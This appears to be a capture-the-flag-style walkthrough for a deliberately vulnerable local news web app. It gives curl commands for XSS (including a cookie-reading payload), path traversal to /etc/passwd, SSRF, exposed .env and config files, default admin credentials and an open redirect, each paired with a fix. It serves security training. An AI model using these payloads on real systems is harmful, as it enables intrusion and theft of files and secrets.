# HaMivtzar News Lab — findings walkthrough

Base URL below assumes `http://127.0.0.1:8099`. Every command targets **your own
local lab**. Each item maps to a `# [VULN-xx]` tag in `app.py`.

> Try to find these yourself first. Spoilers below.

---

## VULN-01 — Reflected XSS (search)
The search page echoes the query into HTML without escaping.
```
curl -s 'http://127.0.0.1:8099/newssearch?q=<script>alert(1)</script>'
```
You'll see the raw `<script>` reflected inside `<h2>תוצאות חיפוש עבור: …</h2>`.
**Fix:** HTML-escape user input (`html.escape`) before templating; add a CSP.

## VULN-02 — IDOR / broken access control (drafts)
Draft `1999` is never linked from the lobby, but the article endpoint serves any
id and leaks the internal editor note.
```
curl -s 'http://127.0.0.1:8099/article?id=1999'
```
**Fix:** enforce `published == True` (and real authz) in the handler, not just in
the lobby's link rendering.

## VULN-03 — Path traversal / LFI (`/AjaxPage`)
`jspName` is joined to `feeds/` with no sanitization.
```
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=SECRET_internal.json'
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=../seed.py'
curl -s 'http://127.0.0.1:8099/AjaxPage?jspName=../../../../etc/passwd'
```
**Fix:** allow-list feed names, or `os.path.realpath` + verify the result stays
inside `FEEDS_DIR`.

## VULN-04 — SSRF (`/proxy/multivac`)
The recommendation-proxy fetches any `url` server-side.
```
curl -s 'http://127.0.0.1:8099/proxy/multivac?url=http://127.0.0.1:8099/config/version'
# on a real network this reaches internal-only hosts / cloud metadata endpoints
```
**Fix:** allow-list destination hosts/schemes; block private/loopback ranges;
disable redirects.

## VULN-05 — Stored XSS (writers chat)
`POST /api/chat` stores `text` raw; the lobby renders it unescaped.
```
curl -s --data-urlencode 'reporter=attacker' \
        --data-urlencode 'text=<img src=x onerror=alert(document.cookie)>' \
        http://127.0.0.1:8099/api/chat
curl -s http://127.0.0.1:8099/   # payload is present unescaped
```
**Fix:** escape on output; sanitize/validate on input; CSP.

## VULN-06 — Missing security headers
No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`.
```
curl -sD - -o /dev/null http://127.0.0.1:8099/
```
Enables clickjacking and makes the XSS above trivially exploitable.
**Fix:** set the headers in `_send()`.

## VULN-07 — Information disclosure
`/config/version` (and `Server:` header, and verbose proxy errors) leak build
host, feature flags, and a secret-looking key.
```
curl -s http://127.0.0.1:8099/config/version
```
**Fix:** don't ship internal config to clients; generic error messages; strip the
`Server` banner.

## VULN-08 — Weak/default admin creds, no lockout
```
curl -s 'http://127.0.0.1:8099/admin?user=admin&pass=admin'
```
No rate limiting → brute-forceable.
**Fix:** strong unique creds, hashing, rate limiting/lockout, MFA, POST + CSRF token.

## VULN-09 — Open redirect (`/go`)
```
curl -sD - -o /dev/null 'http://127.0.0.1:8099/go?url=https://example.org/evil'
```
**Fix:** allow-list internal destinations; never redirect to raw user input.

## VULN-10 — Sensitive file exposure (`/.env`)
```
curl -s http://127.0.0.1:8099/.env
```
**Fix:** never serve dotfiles; keep secrets out of web root; use secret managers.

---

## Suggested tooling to practise with (all against THIS lab only)
- `curl` / `httpie` for manual probing (above).
- **Burp Suite** / **OWASP ZAP** proxy + spider + active scan against `127.0.0.1:8099`.
- `ffuf` / `gobuster` for content discovery (`/admin`, `/.env`, `/config/version`).
- `nikto` for a quick misconfig sweep.
- Write your own small Python client (see `deobfuscate.py` for style).
